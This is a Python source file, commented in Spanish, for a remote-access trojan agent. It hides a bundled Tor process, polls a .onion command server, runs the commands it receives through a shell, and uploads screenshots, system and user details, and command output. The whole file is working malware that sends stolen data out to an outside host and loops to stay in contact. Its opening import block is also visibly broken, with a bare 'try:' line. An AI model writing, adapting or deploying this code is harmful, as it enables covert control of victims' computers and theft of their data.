import os
import platform
import subprocess
import time
import requests
try:
import sys
import time

try:
    from PIL import ImageGrab
except ImportError:
    os.system("python -m pip install pillow -q -q -q")
    from PIL import ImageGrab

C2_URL = "http://gtcgxxmk4i56abnsjzpuzhu4uv4dka3pwhyg4i7fztz6wproytmxemid.onion"

# Variable global para saber si arrancamos nuestro propio Tor
TOR_PROCESS = None

def get_base_path():
    """Retorna la ruta base, dependiendo de si es un script o un EXE compilado."""
    if hasattr(sys, '_MEIPASS'):
        return sys._MEIPASS
    return os.path.dirname(os.path.abspath(__file__))

def start_tor_silently():
    global TOR_PROCESS
    base_path = get_base_path()
    tor_exe_path = os.path.join(base_path, "tor.exe")
    
    if os.path.exists(tor_exe_path):
        print("[*] Iniciando Tor interno...")
        # Lanza tor.exe de forma invisible (creationflags=0x08000000) en el puerto 9051
        TOR_PROCESS = subprocess.Popen([tor_exe_path, "--SocksPort", "9051"], 
                                       creationflags=0x08000000, 
                                       stdout=subprocess.DEVNULL, 
                                       stderr=subprocess.DEVNULL)
        time.sleep(10) # Espera a que Tor conecte
    else:
        print("[!] No se encontro tor.exe interno. Se asume Tor externo en 9050.")

PROXIES = {
    'http': 'socks5h://127.0.0.1:9051', # Usamos 9051 para no chocar con el tuyo si lo tienes abierto
    'https': 'socks5h://127.0.0.1:9051'
}


def get_command():
    """Consulta al servidor si hay nuevas órdenes"""
    try:
        response = requests.get(f"{C2_URL}/get_task", proxies=PROXIES, timeout=30)
        if response.status_code == 200 and response.text:
            return response.text.strip()
    except Exception:
        pass
    return None

def send_result(data, is_file=False):
    """Envía resultados o archivos al servidor"""
    try:
        if is_file:
            with open(data, 'rb') as f:
                requests.post(f"{C2_URL}/result", files={'file': f}, proxies=PROXIES)
        else:
            requests.post(f"{C2_URL}/result", data={'output': data}, proxies=PROXIES)
    except Exception as e:
        print(f"Error enviando datos: {e}")

def execute_command(command):
    if command == 'esperar':
        return None
        
    # Comandos especiales heredados de client.py
    if command == 'screenshot':
        file_path = "screenshot.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            send_result(file_path, is_file=True)
            os.remove(file_path)
            return "Screenshot enviada al C2."
        except Exception as e:
            return f"Error en screenshot: {e}"
            
    elif command == 'info':
        sys_info = {
            'Platform': platform.platform(),
            'User': os.getlogin(),
            'CPU': os.cpu_count()
        }
        return '\n'.join(f"{k}: {v}" for k, v in sys_info.items())
        
    elif command == 'location':
        try:
            # Aunque usemos Tor, podemos intentar ver la IP de salida de Tor
            res = requests.get('https://ifconfig.me/ip', proxies=PROXIES)
            return f"IP de salida de Tor: {res.text.strip()}"
        except:
            return "No se pudo obtener la ubicación."

    elif command.startswith('cd '):
        path = command[3:].strip()
        try:
            os.chdir(path)
            return f"Directorio cambiado a: {os.getcwd()}"
        except Exception as e:
            return str(e)

    # Ejecución de comandos de sistema (PowerShell/CMD)
    else:
        try:
            # Usamos shell=True para compatibilidad
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('latin-1', errors='replace').strip()
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output.decode('latin-1', errors='replace').strip()}"

def main():
    start_tor_silently()
    print(f"[*] Agente conectado al C2 Tor: {C2_URL}")
    
    # Bucle de persistencia
    while True:
        command = get_command()
        if command:
            print(f"[!] Orden recibida: {command}")
            result = execute_command(command)
            if result:
                send_result(result)
        
        # Poll cada 10 segundos para no saturar
        time.sleep(10)

if __name__ == '__main__':
    main()
